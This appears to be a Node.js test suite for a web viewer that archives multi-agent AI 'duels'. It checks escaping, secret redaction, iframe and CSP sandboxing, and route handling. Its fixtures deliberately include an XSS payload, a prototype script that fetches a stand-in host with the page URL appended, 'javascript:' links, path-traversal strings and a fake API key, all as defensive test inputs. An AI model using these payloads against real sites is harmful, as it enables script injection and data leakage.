import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { Readable } from "node:stream";
import { runInNewContext } from "node:vm";
import { ROUNDTABLE_HOME } from "../../dist/config.js";
import { SecureServer } from "../../dist/http/secure-server.js";
import { INDEX_CSP, indexRoutes } from "../../dist/serve/index.js";
import { agentGlyph, agentRole } from "../../dist/serve/agent-glyph.js";
import { duelData, loadDuel, redactedData } from "../../dist/serve/duel-data.js";
import { duelPageRoutes, renderDuel, renderDuels, renderCasting } from "../../dist/serve/duel-pages.js";
import { DuelArtifactStore, DuelPreviewHost } from "../../dist/serve/duel-prototypes.js";
import { DUEL_JS, DUEL_CSS } from "../../dist/serve/duel-assets.js";
import { inlineProblems } from "./helpers.mjs";

const secret = "sk-ant-archivefixture1234567890";
const attack = '<img src=x onerror="bad()">';
const seats = [
  { id: "A:ada", name: "Ada", role: "designer", team: "A", provider: "anthropic", model: "model-a" },
  { id: "A:bea", name: "Bea", role: "builder", team: "A", provider: "openai", model: "model-b" },
  { id: "B:cy", name: "Cy", role: "critic", team: "B", provider: "ollama", model: "local-model" },
  { id: "B:dee", name: "Dee", role: "builder", team: "B", provider: "codex", model: "runtime-default" },
  { id: "judge:eli", name: "Eli", role: "judge", team: "judge", provider: "openai", model: "judge-model" },
];
const webSource = `<html><head><style>body{color:navy}</style></head><body>Prototype<script>document.body.textContent = location.href + location.origin + document.referrer; fetch('https://invalid.example/' + location.href);</script><!-- ${secret} --></body></html>`;
function fixture(id = "duel-pages-old", rich = false, aborted = false) {
  const events = [
    { type: "start", id, topic: `A useful planner ${attack}`, startedAt: rich ? "2026-11-17T15:00:00Z" : "2026-11-16T15:00:00Z", mode: "duel", kind: "web", seats, criteria: ["Clarity", `Usability ${attack}`], teams: { A: ["A:ada", "A:bea"], B: ["B:cy", "B:dee"] }, ...(rich && { stages: [{ index: 1, name: "Skeleton" }, { index: 2, name: "Polish" }] }) },
    { type: "turn", seat: seats[2], round: "R1", text: "A smaller planner", ts: "2026-11-17T15:00:01Z" },
    { type: "turn", seat: seats[0], round: "R1", text: `The concept ${attack} ${secret}`, ts: "2026-11-17T15:00:02Z" },
    { type: "turn", seat: seats[1], round: "R1c", text: "Check keyboard access", ts: "2026-11-17T15:00:03Z" },
    { type: "turn", seat: seats[2], round: "R1c", text: "Check the constraints", ts: "2026-11-17T15:00:04Z" },
    ...(rich ? [{ type: "stage", team: "A", stage: 1, of: 2, name: "Skeleton", status: "started", ts: "2026-11-17T15:00:05Z" }] : []),
    { type: "turn", seat: seats[1], round: "R1b", text: "The first build. ".repeat(100), ts: "2026-11-17T15:00:10Z" },
    { type: "turn", seat: seats[3], round: "R1b", text: "A module instead", ts: "2026-11-17T15:00:11Z" },
    { type: "prototype", team: "A", seat: seats[1], title: "A clear planner", kind: "web", ok: true, files: [{ path: "index.html", bytes: Buffer.byteLength(webSource) }], ...(rich && { version: 1, stage: 1 }) },
    { type: "prototype", team: "B", seat: seats[3], title: "Planner module", kind: "code", ok: true, files: [{ path: "planner.ts", bytes: 32 }] },
    ...(rich ? [
      { type: "stage", team: "A", stage: 1, of: 2, name: "Skeleton", status: "done", version: 1, ts: "2026-11-17T15:00:12Z" },
      { type: "stage", team: "A", stage: 2, of: 2, name: "Polish", status: "started", ts: "2026-11-17T15:00:13Z" },
      { type: "turn", seat: seats[1], round: "R1b", text: "The polished build", ts: "2026-11-17T15:00:14Z" },
      { type: "prototype", team: "A", seat: seats[1], title: "Polished planner", kind: "web", ok: true, files: [{ path: "index.html", bytes: 20 }], version: 2, stage: 2 },
      { type: "stage", team: "A", stage: 2, of: 2, name: "Polish", status: "done", version: 2, ts: "2026-11-17T15:00:15Z" },
    ] : []),
    { type: "turn", seat: seats[4], round: "R2", text: "A needs clearer labels.", ts: "2026-11-17T15:00:20Z" },
    { type: "assessment", judge: seats[4], team: "A", verdict: "REVISE", reason: `Label every control ${attack}`, ...(rich && { version: 2 }) },
    { type: "assessment", judge: seats[4], team: "B", verdict: "REJECT", reason: "Cannot use it in a browser" },
    { type: "turn", seat: seats[1], round: "R3", text: "Labels revised", ts: "2026-11-17T15:00:30Z" },
    { type: "turn", seat: seats[0], round: "tool", text: "Inspected an input", ts: "2026-11-17T15:00:31Z" },
    { type: "turn", seat: seats[2], round: "R4", text: "A concern remains", ts: "2026-11-17T15:00:40Z" },
    { type: "dissent", seat: seats[2], team: "A", text: `I dissent: keyboard use is untested ${attack}` },
    { type: "usage", perSeat: [
      { seatId: seats[1].id, inputTokens: 123456789012, outputTokens: 4111111111111111, costUsd: 0.125 },
      { seatId: seats[2].id, inputTokens: 400, outputTokens: 500, costUsd: 0, unpricedTokens: 900, estimated: true },
    ], totalCostUsd: 0.125, totalUnpricedTokens: 900 },
    { type: "end", winner: aborted ? "none" : "A", tally: { A: 0, B: -1 }, aborted, ...(rich && { decidedBy: "human", metrics: { A: { elapsedMs: 40000, stagesDone: 2, stagesTotal: 2, versions: 2, rewrites: 1, turns: 4, failedTurns: 0, pageErrors: 0, validationFailures: 1, toolCalls: 1, finishedAt: "2026-11-17T15:00:40Z" }, B: { elapsedMs: 25000, stagesDone: 1, stagesTotal: 1, versions: 1, rewrites: 0 } } }) },
  ];
  const prototypes = events.flatMap((event, eventIndex) => event.type === "prototype" ? [{ eventIndex, team: event.team, files: event.files.map(file => ({ path: file.path, content: file.path === "index.html" ? event.version === 2 ? "<h1>Polished planner</h1>" : webSource : "export const plan = () => []" })) }] : []);
  return { version: rich ? 2 : 1, events, prototypes };
}
function save(id, raw) {
  mkdirSync(join(ROUNDTABLE_HOME, "duels"), { recursive: true });
  writeFileSync(join(ROUNDTABLE_HOME, "duels", `${id}.json`), typeof raw === "string" ? raw : JSON.stringify(raw));
}
// Exercise the actual SecureServer dispatcher without binding a port or making any network calls.
function harness(t) {
  const host = new DuelPreviewHost(async () => ({ origin: "http://127.0.0.1:24567", close() {} }));
  const server = new SecureServer({ name: "Duel page test", routes: duelPageRoutes(INDEX_CSP, host) }, {});
  server.port = 23456;
  t.after(() => host.close());
  return { host, base: server.base, request: async (path, method = "GET") => {
    const req = Readable.from([]);
    req.url = server.base.slice(0, -1) + path; req.method = method; req.headers = { host: "127.0.0.1:23456" };
    let status, headers, body;
    await server.route(req, { writeHead(s, h) { status = s; headers = h; }, end(b) { body = b; }, destroy() {} });
    return { status, headers, text: String(body ?? "") };
  } };
}

test("figures are deterministic, varied, accessible, and mark every role", () => {
  assert.equal(agentGlyph("Ada", "builder"), agentGlyph("Ada", "builder"));
  assert.notEqual(agentGlyph("Ada", "builder"), agentGlyph("Bea", "builder"));
  for (const role of ["builder", "designer", "judge", "critic", "other"]) {
    const svg = agentGlyph(`Ada ${attack}`, role);
    assert.match(svg, new RegExp(`accessory-${role}`));
    assert.match(svg, /role="img" aria-label="Ada &lt;img/);
    assert.ok(!svg.includes("<img"));
    // The shared regex checker also matches 'onerror=' inside an escaped aria-label.
    assert.deepEqual(inlineProblems(agentGlyph("Ada", role)), []);
  }
  assert.equal(agentRole("software engineer"), "builder");
  assert.equal(agentRole("skeptic"), "critic");
});

test("2.0 archive route shows table seats, models, outcome, and accessible external assets", async t => {
  save("duel-pages-old", fixture());
  const { request } = harness(t);
  const r = await request("/duels/duel-pages-old");
  assert.equal(r.status, 200);
  assert.match(r.text, /A useful planner &lt;img/);
  assert.match(r.text, /Team A wins/);
  assert.match(r.text, /Judged on/);
  assert.match(r.text, /<time datetime=/);
  assert.doesNotMatch(r.text, />2026-11-1[67]T/);
  const svg = r.text.match(/<svg class="duel-table"[\s\S]*?<\/div>/)[0];
  for (const s of seats) {
    assert.ok(svg.includes(`aria-label="${s.name}, ${s.role},`));
    assert.ok(svg.includes(`${s.provider} / ${s.model}`));
    assert.match(r.text, new RegExp(`data-filter-seat="${s.id}"`));
  }
  assert.match(r.text, /aria-current="page">Duels/);
  assert.match(r.text, /static\/duel\.css/);
  assert.match(r.text, /static\/duel\.js/);
  assert.doesNotMatch(r.text, /static\/dashboard\.js/); // Reading pages must not auto-refresh.
  assert.deepEqual(inlineProblems(r.text), []);
  assert.ok(!r.headers["Content-Security-Policy"].includes("unsafe-inline"));
});

test("every model string is escaped and secrets are redacted on page and JSON download", async t => {
  save("duel-pages-escape", fixture("duel-pages-escape"));
  const { request } = harness(t);
  const html = await request("/duels/duel-pages-escape");
  assert.ok(html.text.includes("&lt;img src=x onerror=&quot;bad()&quot;&gt;"));
  assert.doesNotMatch(html.text, /<img|<script>document|sk-ant-/);
  assert.match(html.text, /\[redacted:api_key\]/);
  assert.match(html.text, /<details class="duel-card raw-archive"><summary>Raw archive \(JSON\)/);
  const json = await request("/duels/duel-pages-escape.json");
  assert.equal(json.status, 200);
  assert.match(json.headers["Content-Disposition"], /^attachment; filename="duel-pages-escape.json"$/);
  assert.match(json.headers["Content-Type"], /application\/json/);
  assert.ok(!json.text.includes(secret));
  assert.match(json.text, /redacted:api_key/);
  const data = JSON.parse(json.text);
  assert.equal(data.events.find(e => e.type === "usage").perSeat[0].outputTokens, 4111111111111111);
});

test("turn cards follow round order and link concepts, critiques, judging and revisions", () => {
  const d = duelData("duel-flow", fixture());
  const html = renderDuel("/token/", d);
  const cards = [...html.matchAll(/<article id="turn-(\d+)"/g)].map(m => Number(m[1]));
  assert.deepEqual([...cards].sort((a, b) => a - b), d.turns.map(t => t.index).sort((a, b) => a - b));
  const orders = cards.map(i => d.turns.find(t => t.index === i).order);
  assert.deepEqual(orders, [...orders].sort((a, b) => a - b));
  assert.deepEqual(d.turns.map(t => t.label), ["Concept", "Concept", "Critique", "Critique", "Build", "Build", "Judging", "Revision", "Tool interaction", "Closing statement"]);
  assert.match(html, /Responds to <a href="#turn-2"[^>]*>Ada · R1/);
  assert.match(html, /href="#assessment-0">Eli's REVISE/);
  assert.match(html, /href="#turn-\d+" data-related-seat="judge:eli">Eli · R2/);
  assert.match(html, /class="turn-expand"><summary>/);
  assert.match(html, /Show more/);
  assert.match(html, /interaction-card/);
  assert.match(html, /dissent-card/);
  assert.match(html, /Dissent on Team A/);
});

test("2.1 stages, versions, team metrics and human judgment remain readable", async t => {
  save("duel-pages-rich", fixture("duel-pages-rich", true));
  const { request } = harness(t);
  const { text } = await request("/duels/duel-pages-rich");
  for (const label of ["Skeleton", "Polish", "Polished planner", "Version 2", "1 other version", "Build stages and team progress", "2 of 2 stages", "Chosen by a person", "40s active time"]) assert.ok(text.includes(label), label);
  assert.match(text, /Stage 2: Polish/);
  assert.deepEqual(inlineProblems(text), []);
});

test("usage is collapsed, retains exact large token numbers and reports unpriced tokens", () => {
  const html = renderDuel("/token/", duelData("duel-usage", fixture()));
  assert.match(html, /<details class="duel-card usage-card"><summary>/);
  assert.match(html, /123,456,789,012/);
  assert.match(html, /4,111,111,111,111,111/);
  assert.match(html, /900 tokens unpriced/);
  assert.match(html, /\$0\.1250/);
  assert.match(html, /aria-label="Per-agent token usage"/);
});

test("web Run uses a secret-free listener, response sandbox and iframe sandbox", async t => {
  save("duel-pages-run", fixture("duel-pages-run"));
  const { request, host, base } = harness(t);
  const html = await request("/duels/duel-pages-run");
  const frame = html.text.match(/<iframe class="artifact-frame"[^>]+>/)[0];
  const url = new URL(frame.match(/src="([^"]+)"/)[1]);
  assert.ok(!url.href.includes(base.slice(1, -1)));
  assert.match(url.pathname, /^\/artifacts\/[a-f0-9]{64}\/index\.html$/);
  assert.match(frame, /sandbox="allow-scripts"/);
  assert.doesNotMatch(frame, /allow-same-origin/);
  assert.match(frame, /referrerpolicy="no-referrer"/);
  assert.match(html.headers["Content-Security-Policy"], /frame-src http:\/\/127\.0\.0\.1:24567/);
  const app = host.store.response(url.pathname, "GET", url.host, "127.0.0.1", 24567);
  assert.equal(app.status, 200);
  assert.match(app.headers["Content-Type"], /text\/html/);
  assert.match(app.headers["Content-Security-Policy"], /sandbox allow-scripts(?:;|$)/);
  assert.match(app.headers["Content-Security-Policy"], /default-src 'none'/);
  assert.match(app.headers["Content-Security-Policy"], /connect-src 'none'/);
  assert.match(app.headers["Content-Security-Policy"], /frame-ancestors http:\/\/127\.0\.0\.1:23456/);
  assert.doesNotMatch(app.headers["Content-Security-Policy"], /allow-same-origin|script-src 'self'/);
  assert.match(app.body, /location\.href/);
  assert.ok(!app.body.includes(base.slice(1, -1)));
  assert.ok(!JSON.stringify(app).includes(secret));
});

test("artifact server serves only web index.html as HTML; other files are inert; traversal fails", () => {
  const store = new DuelArtifactStore();
  const prototype = { index: 1, title: "Hostile files", kind: "web", ok: true, team: "A", version: 1, error: "", files: [
    { path: "index.html", content: "<script>location.href</script>", bytes: 30 },
    { path: "other.html", content: "<script>alert(1)</script>", bytes: 25 },
    { path: "nested/test.js", content: "alert(1)", bytes: 8 },
  ] };
  const path = store.add(prototype, "http://127.0.0.1:23456");
  const get = (target, method = "GET", host = "127.0.0.1:24567") => store.response(target, method, host, "127.0.0.1", 24567);
  for (const file of ["other.html", "nested/test.js"]) {
    const r = get(path + file);
    assert.equal(r.status, 200);
    assert.match(r.headers["Content-Type"], /text\/plain/);
    assert.equal(r.headers["X-Content-Type-Options"], "nosniff");
    assert.match(r.headers["Content-Security-Policy"], /sandbox/);
  }
  const nonWeb = store.add({ ...prototype, kind: "code" }, "http://127.0.0.1:23456");
  assert.match(get(nonWeb + "index.html").headers["Content-Type"], /text\/plain/);
  for (const target of [path + "unknown", path + "../index.html", path + "%2e%2e/index.html", path + "%2Findex.html", path + "nested/../../index.html", path + "nested\\test.js", path + "index.html?x=1", "/state.json", "/duels", "https://evil.example/"]) assert.equal(get(target).status, 404, target);
  assert.equal(get(path + "index.html", "POST").status, 405);
  assert.equal(get(path + "index.html", "GET", "evil.example:24567").status, 421);
  assert.equal(get(path + "index.html", "HEAD").body, "");
});

test("non-web source has no Run button, and missing source or listener gives View code", async t => {
  const d = duelData("duel-source", fixture());
  const offline = new DuelPreviewHost(async () => { throw new Error("bind unavailable"); });
  t.after(() => offline.close());
  assert.equal((await offline.publish(d.prototypes, "http://127.0.0.1:23456")).size, 0);
  assert.equal((await offline.publish(d.prototypes, "http://100.64.0.1:23456")).size, 0);
  const html = renderDuel("/token/", d);
  assert.match(html, /View code/);
  assert.match(html, /needs its own runtime/);
  assert.match(html, /Run is unavailable/);
  assert.doesNotMatch(html, /<iframe/);
  assert.match(html, /export const plan/);
});

test("duels list sorts archives newest first, shows teams, dissents, live sessions and abortion", async t => {
  save("duel-pages-old", fixture()); save("duel-pages-rich", fixture("duel-pages-rich", true));
  save("duel-pages-aborted", fixture("duel-pages-aborted", false, true));
  const { request } = harness(t);
  const { text, status } = await request("/duels");
  assert.equal(status, 200);
  assert.ok(text.indexOf('duels/duel-pages-rich"') < text.indexOf('duels/duel-pages-old"'));
  assert.match(text, /Aborted/); assert.match(text, /1 dissent/);
  assert.match(text, /mini-agent/); assert.deepEqual(inlineProblems(text), []);
  const live = renderDuels("/token/", [duelData("duel-one", fixture())], [{ id: "live", started: "2026-11-18T15:00:00Z", agents: ["Ada", "Cy"], host: "test", roomUrl: "http://127.0.0.1:5555/room/" }]);
  assert.ok(live.indexOf("Live now") < live.indexOf("Archived duels"));
  assert.match(live, />Live<\/span>/); assert.match(live, /Open live room/);
  assert.doesNotMatch(renderDuels("/token/", [], [{ id: "live", agents: [], started: "", host: "test", roomUrl: "javascript:alert(1)" }]), /javascript:/);
});

test("empty pages, malformed shapes and partial archives render without throwing", async t => {
  const { request } = harness(t);
  for (const [id, data] of [["duel-pages-broken", "{no"], ["duel-pages-malformed", { events: [null, 4, { type: "start", topic: attack, seats: [null, 17, "person"], criteria: {}, teams: null }, { type: "turn", seat: {}, text: {}, round: [] }, { type: "prototype", files: [null, { path: "../bad" }], team: [] }, { type: "usage", perSeat: [null] }], prototypes: [null] }], ["duel-pages-partial", { events: [{ type: "start", topic: "Unfinished", seats: [] }] }]]) save(id, data);
  assert.equal((await request("/duels")).status, 200);
  assert.equal((await request("/duels/duel-pages-broken")).status, 404);
  for (const id of ["duel-pages-malformed", "duel-pages-partial"]) {
    const r = await request(`/duels/${id}`); assert.equal(r.status, 200); assert.match(r.text, /archive is partial/); assert.deepEqual(inlineProblems(r.text), []);
  }
  for (const input of [null, false, "bad", [], { events: "invalid" }, { events: [null] }]) assert.doesNotThrow(() => renderDuel("/token/", duelData("partial", input)));
  assert.match(renderDuels("/token/", []), /No duels yet/);
  assert.match(renderDuels("/token/", []), /roundtable duel/);
  assert.match(renderCasting("/token/"), /No casting report yet/);
  for (const path of ["/duels/unknown", "/duels/unknown.json", "/duels/%2Fetc", "/duels/%2e%2e.json"]) assert.equal((await request(path)).status, 404, path);
});

test("casting fixture shows ranked figures, verdict reasons, prompt findings, similarity and usage", async t => {
  mkdirSync(join(ROUNDTABLE_HOME, "casting"), { recursive: true });
  const report = { id: "cast-pages", createdAt: "2026-11-18T14:00:00Z", brief: `Choose planner candidates ${attack}`, note: `Partial audition ${secret}`, dryRun: true, agents: [
    { key: "backup", name: "Backup", role: "critic", verdict: "bench", strengths: ["Finds edge cases"], risks: ["Long responses"], overlapsWith: ["primary"], lint: [{ level: "warn", code: "short-body", message: "Very short persona" }] },
    { key: "primary", name: "Primary", role: "designer", verdict: "cast", strengths: ["Clear interfaces"], risks: [], overlapsWith: [], lint: [] },
  ], redundancy: [{ keys: ["primary", "backup"], reason: `Similar prompt ${attack}` }], gaps: ["Accessibility specialist"], recommended: { seats: ["primary"], teamA: ["primary"], teamB: ["backup"], judges: ["Eli"] }, usage: { totalCostUsd: 0.12, capUsd: 2, spentUsd: 0.12, estimated: true, unpricedTokens: 123456789012 } };
  writeFileSync(join(ROUNDTABLE_HOME, "casting", "latest.json"), JSON.stringify(report));
  t.after(() => rmSync(join(ROUNDTABLE_HOME, "casting", "latest.json"), { force: true }));
  const { request } = harness(t), r = await request("/casting");
  assert.equal(r.status, 200);
  for (const text of ["Choose planner candidates &lt;img", "Recommended", "Reserve", "Clear interfaces", "Long responses", "Very short persona", "Similar prompt", "Accessibility specialist", "123,456,789,012", "Raw report (JSON)"]) assert.ok(r.text.includes(text), text);
  assert.ok(r.text.indexOf("<h2>Primary</h2>") < r.text.indexOf("<h2>Backup</h2>"));
  assert.match(r.text, /agent-glyph role-designer/); assert.match(r.text, /<time /);
  assert.ok(!r.text.includes(secret)); assert.deepEqual(inlineProblems(r.text), []);
  writeFileSync(join(ROUNDTABLE_HOME, "casting", "latest.json"), "{broken");
  assert.match((await request("/casting")).text, /No casting report yet/);
  for (const bad of [null, [], { agents: [null, {}], redundancy: [null], recommended: false, usage: "bad" }]) assert.doesNotThrow(() => renderCasting("/token/", bad));
});

test("owned routes are wired, static assets are external, responsive styles and script parse", async t => {
  const { request } = harness(t);
  assert.ok(indexRoutes().some(r => r.path === "/duels"));
  for (const [path, type] of [["/static/duel.css", "text/css"], ["/static/duel.js", "text/javascript"]]) {
    const r = await request(path); assert.equal(r.status, 200); assert.ok(r.headers["Content-Type"].startsWith(type));
  }
  assert.match(DUEL_CSS, /@media\(max-width:560px\)/);
  assert.match(DUEL_CSS, /grid-template-columns:minmax\(0,1fr\)/);
  assert.match(DUEL_CSS, /duel-table-scroll\{overflow-x:auto/);
  assert.match(DUEL_CSS, /focus-visible/);
  assert.doesNotMatch(DUEL_JS, /innerHTML|eval\(/);
  runInNewContext(DUEL_JS, { document: { querySelector() { return null; } } });
});

test("seat focus and activation filter lanes; response links and Show all restore the flow", () => {
  const node = (dataset = {}, label = "") => ({
    dataset, hidden: false, attrs: {}, events: {}, textContent: label, classes: new Set(),
    classList: { toggle() {} }, setAttribute(k, v) { this.attrs[k] = v; },
    addEventListener(type, fn) { this.events[type] = fn; },
    querySelector() { return { textContent: label }; }, focus() { this.focused = true; }, scrollIntoView() { this.scrolled = true; },
  });
  const a = node({ turnSeat: "A:ada" }), b = node({ turnSeat: "B:cy" });
  const aSeat = node({ filterSeat: "A:ada" }, "Ada"), bSeat = node({ filterSeat: "B:cy" }, "Cy");
  for (const seat of [aSeat, bSeat]) seat.classList.toggle = (c, on) => on ? seat.classes.add(c) : seat.classes.delete(c);
  const laneA = node(), laneB = node(), roundA = node(), roundB = node();
  laneA.querySelectorAll = () => [a]; laneB.querySelectorAll = () => [b];
  roundA.querySelectorAll = s => s === ".flow-lane" ? [laneA] : [a];
  roundB.querySelectorAll = s => s === ".flow-lane" ? [laneB] : [b];
  const toolbar = node(), status = node(), clear = node(), response = node(), flow = node();
  toolbar.hidden = true; response.hash = "#turn-b";
  const page = {
    classList: { toggle() {} },
    querySelectorAll(s) { return ({ "[data-turn-seat]": [a, b], "[data-filter-seat]": [aSeat, bSeat], "[data-flow-round]": [roundA, roundB], ".turn-response a": [response] })[s] ?? []; },
    querySelector(s) { return ({ ".flow-filter": toolbar, "#filter-status": status, "[data-clear-filter]": clear, "#turn-flow": flow })[s] ?? null; },
  };
  runInNewContext(DUEL_JS, { document: { querySelector: () => page, getElementById: () => b } });
  aSeat.events.focus();
  assert.equal(a.hidden, false); assert.equal(b.hidden, true);
  assert.equal(roundA.hidden, false); assert.equal(roundB.hidden, true);
  assert.equal(laneB.hidden, true); assert.equal(toolbar.hidden, false);
  assert.equal(status.textContent, "Following Ada · 1 turn");
  assert.equal(aSeat.attrs["aria-pressed"], "true"); assert.equal(bSeat.attrs["aria-pressed"], "false");
  response.events.click();
  assert.equal(b.hidden, false); assert.equal(b.focused, true);
  assert.equal(b.attrs.tabindex, "-1"); assert.equal(status.textContent, "All agents");
  let prevented = false;
  bSeat.events.keydown({ key: " ", preventDefault() { prevented = true; } });
  assert.equal(prevented, true); assert.equal(flow.scrolled, true); assert.equal(a.hidden, true);
  clear.events.click(); assert.equal(a.hidden, false); assert.equal(b.hidden, false);
  assert.equal(roundA.hidden, false); assert.equal(roundB.hidden, false);
  bSeat.events.click(); assert.equal(a.hidden, true); assert.equal(b.hidden, false);
});

test("preview host starts lazily, reuses its listener, bounds artifacts and clears on close", async () => {
  let starts = 0, closes = 0;
  const host = new DuelPreviewHost(async () => { starts++; return { origin: "http://127.0.0.1:24567", close() { closes++; } }; });
  assert.equal((await host.publish([], "http://127.0.0.1:23456")).size, 0);
  assert.equal(starts, 0);
  const prototype = { index: 0, team: "A", title: "A", kind: "web", ok: true, version: 1, error: "", files: [{ path: "index.html", content: "<h1>A</h1>", bytes: 10 }] };
  const urls = await host.publish([prototype], "http://127.0.0.1:23456");
  await host.publish([prototype], "http://127.0.0.1:23456");
  assert.equal(starts, 1); assert.equal(urls.size, 1);
  const first = new URL(urls.get(0)).pathname;
  for (let i = 0; i < 25; i++) host.store.add({ ...prototype, files: [{ path: "index.html", content: `<h1>${i}</h1>`, bytes: 10 }] }, "http://127.0.0.1:23456");
  assert.equal(host.store.response(first, "GET", "127.0.0.1:24567", "127.0.0.1", 24567).status, 404);
  host.close(); host.close();
  await Promise.resolve(); assert.equal(closes, 1);
});

test("redaction preserves numeric usage while removing secrets, PII and sensitive fields", () => {
  const safe = redactedData({ inputTokens: 4111111111111111, text: `${secret} alice@example.com ${attack}`, password: "ordinary words", token: "hidden", nested: { outputTokens: 123456789012 } });
  assert.equal(safe.inputTokens, 4111111111111111);
  assert.equal(safe.nested.outputTokens, 123456789012);
  assert.ok(!JSON.stringify(safe).includes(secret));
  assert.ok(!JSON.stringify(safe).includes("alice@example.com"));
  assert.equal(safe.password, "[redacted:secret]");
});

test("turn text renders light markdown safely, zero dissents are muted, and one seat view shows per width", () => {
  const base = fixture("duel-markdown");
  base.events = base.events.map(ev => ev.type === "turn" && ev.text === "A smaller planner"
    ? { ...ev, text: `**The Pegboard.** A [link](javascript:alert(1)) and ${attack}` } : ev).filter(ev => ev.type !== "dissent");
  const html = renderDuel("/token/", duelData("duel-markdown", base));
  assert.match(html, /<strong>The Pegboard\.<\/strong>/);
  assert.doesNotMatch(html.split('class="duel-card raw-archive"')[0], /\*\*The Pegboard/, "only the raw JSON keeps the original text");
  assert.doesNotMatch(html, /href="javascript:/i, "markdown links become plain text, never anchors");
  assert.doesNotMatch(html, /<img src=x/, "markup in a turn stays escaped");
  assert.match(renderDuels("/token/", [duelData("duel-markdown", base)]), /class="dissent-count none">0 dissents</);
  const longTurn = { ...base, events: base.events.map(ev => ev.type === "turn" && ev.text.startsWith("**The Pegboard") ? { ...ev, text: "**Bold start** and `code` " + "word ".repeat(300) } : ev) };
  const previews = [...renderDuel("/token/", duelData("duel-markdown-long", longTurn)).matchAll(/<span class="turn-preview">([^<]*)</g)].map(m => m[1]);
  assert.ok(previews.some(p => p.startsWith("Bold start and code word")), "the collapsed preview has no markdown markers");
  assert.ok(previews.every(p => !p.includes("**") && !p.includes("`")));
  assert.match(DUEL_CSS, /@media\(min-width:821px\)\{\.seat-roster\{display:none\}\}/);
  assert.match(DUEL_CSS, /@media\(max-width:560px\)\{\.table-card\{display:none\}\}/);
});
